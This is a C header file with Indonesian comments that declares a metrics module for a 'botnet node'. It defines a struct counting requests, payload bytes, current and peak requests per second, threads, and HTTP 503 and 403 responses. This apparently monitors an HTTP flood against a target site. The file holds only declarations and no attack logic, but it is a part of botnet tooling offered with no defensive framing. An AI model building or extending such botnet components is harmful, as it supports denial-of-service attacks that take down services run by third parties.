/**
 * @file metrics.h
 * @brief Pengumpulan metrik performa operasional node botnet.
 */

#ifndef METRICS_H
#define METRICS_H

#include <stdint.h>
#include <stdbool.h>
#include <pthread.h>

typedef struct {
    uint64_t total_requests;
    uint64_t successful_requests;
    uint64_t failed_requests;
    uint64_t bytes_sent;
    uint32_t current_rps;
    uint32_t peak_rps;
    uint32_t active_threads;
    uint32_t http_503_count;
    uint32_t http_403_count;
} BotMetrics;

#ifdef __cplusplus
extern "C" {
#endif

/**
 * @brief Menginisialisasi modul pengumpulan metrik.
 */
void metrics_init(void);

/**
 * @brief Menambahkan counter request baru yang terkirim.
 * @param success Status keberhasilan request (true/false).
 * @param bytes Jumlah byte payload yang dikirim.
 * @param status_code Kode HTTP response yang diterima.
 */
void metrics_record_request(bool success, uint64_t bytes, int status_code);

/**
 * @brief Mengambil salinan snapshot metrik saat ini secara thread-safe.
 * @param out_metrics Pointer ke struct BotMetrics tempat data disalin.
 */
void metrics_get_snapshot(BotMetrics *out_metrics);

/**
 * @brief Mereset seluruh counter metrik ke nilai awal.
 */
void metrics_reset(void);

/**
 * @brief Membersihkan resource modul metrik.
 */
void metrics_destroy(void);

#ifdef __cplusplus
}
#endif

#endif /* METRICS_H */
